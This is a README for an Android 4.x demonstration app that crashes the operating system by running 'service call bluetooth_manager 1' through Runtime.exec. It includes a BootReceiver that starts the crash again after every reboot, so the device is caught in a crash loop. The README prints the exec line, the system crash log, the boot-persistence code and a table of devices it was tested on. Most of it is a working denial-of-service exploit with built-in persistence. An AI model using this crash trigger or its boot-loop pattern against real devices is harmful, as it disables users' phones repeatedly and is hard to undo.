android_bt_manager
==================

This Android 4.x application causes the Android runtime to crash Android.io by making a service call to bluetooth_manager. This android application also demonstrates how to launch an application, or other activities, at device startup/boot. 

**WARNING:** This application causes your Android 4.x device to crash 15 seconds after startup as well as 15 seconds after each reboot. Do not run this application without the delay in `MainActivity`. 

**How it works:**
- `MainActivity` sends service call to `IBluetoothManager`: `Runtime.getRuntime().exec("service call bluetooth_manager 1");`. This crashes the Android OS and causes the phone to shut off. 

```
W/dalvikvm(10717): threadid=16: thread exiting with uncaught exception (group=0x415c4ba8)
E/AndroidRuntime(10717): *** FATAL EXCEPTION IN SYSTEM PROCESS: android.io
E/AndroidRuntime(10717): java.lang.NullPointerException
E/AndroidRuntime(10717):        at android.os.RemoteCallbackList.register(RemoteCallbackList.java:112)
E/AndroidRuntime(10717):        at android.os.RemoteCallbackList.register(RemoteCallbackList.java:78)
E/AndroidRuntime(10717):        at com.android.server.BluetoothManagerService$BluetoothHandler.handleMessage(BluetoothManagerService.java:755)
E/AndroidRuntime(10717):        at android.os.Handler.dispatchMessage(Handler.java:102)
E/AndroidRuntime(10717):        at android.os.Looper.loop(Looper.java:136)
E/AndroidRuntime(10717):        at android.os.HandlerThread.run(HandlerThread.java:61)
```

- On startup, the `BootReceiver` class, a `BroadcastReceiver` waits for `ACTION_BOOT_COMPLETED` to start `Crash` service. 

```Java
if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
Intent serviceIntent = new Intent(context, Crash.class);
context.startService(serviceIntent);
}
```

- `Crash` service starts the `MainActivity`, which causes the system to crash again. 

```Java
Intent i = new Intent(this, MainActivity.class);
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

- Repeat. 

**Application Permissions:** 
- `RECEIVE_BOOT_COMPLETED`

**This application has been tested on the following devices:**

|   Device      |   OS   | Rooted | Runtime |
| ------------- |:------:|:------:|:-------:|
| Nexus 5       | 4.4.2  | ✓      | ART     |
| Moto X        | 4.4.3  | x      | ART     |
| Nexus 5       | 4.4.3  | ✓      | ART     |

